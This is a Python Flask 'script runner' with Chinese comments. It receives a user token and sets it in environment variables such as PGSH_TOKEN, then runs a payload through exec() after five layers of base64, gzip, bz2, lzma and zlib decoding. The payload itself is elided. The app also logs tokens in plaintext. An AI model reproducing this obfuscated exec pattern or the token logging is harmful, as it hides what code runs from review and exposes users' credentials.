from flask import Flask, request, jsonify, render_template
import base64, zlib, lzma, bz2, gzip
import os
import logging
from datetime import datetime

app = Flask(__name__)

# 配置日志
logging.basicConfig(
    filename=f'logs/script_runner_{datetime.now().strftime("%Y%m%d")}.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Token验证函数
def validate_token(token):
    valid_tokens = os.getenv("VALID_TOKENS", "").split(",")
    logging.info(f"验证token: {token}")
    return token in valid_tokens

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/run', methods=['POST'])
def run_script():
    token = request.json.get('token')
    use_proxy = request.json.get('use_proxy', False)
    proxy_url = request.json.get('proxy_url', '')
    
    if not token:
        logging.warning("未提供token")
        return jsonify({"error": "请输入token"}), 401
        
    if not validate_token(token):
        logging.warning(f"无效的token: {token}")
        return jsonify({"error": "token无效"}), 401

    try:
        logging.info(f"开始执行脚本，token: {token}")
        # 设置环境变量
        os.environ['PGSH_TOKEN'] = token
        os.environ['pg_dl'] = str(use_proxy)
        os.environ['use_proxy'] = str(use_proxy)
        if proxy_url:
            os.environ['pg_dlurl'] = proxy_url
        
        result = execute_main_script()
        logging.info("脚本执行成功")
        return jsonify({"success": True, "result": result})
        
    except Exception as e:
        logging.error(f"脚本执行错误: {str(e)}")
        return jsonify({"error": f"执行出错: {str(e)}"}), 500

def execute_main_script():
    # 执行主脚本逻辑
    exec((lambda uaXsf:compile(uaXsf,'<string>','exec'))(zlib.decompress(lzma.decompress(bz2.decompress(gzip.decompress(base64.b64decode(...)))))))
    return "脚本执行成功"

if __name__ == '__main__':
    # 创建日志目录
    os.makedirs('logs', exist_ok=True)
    app.run(host='0.0.0.0', port=5000) 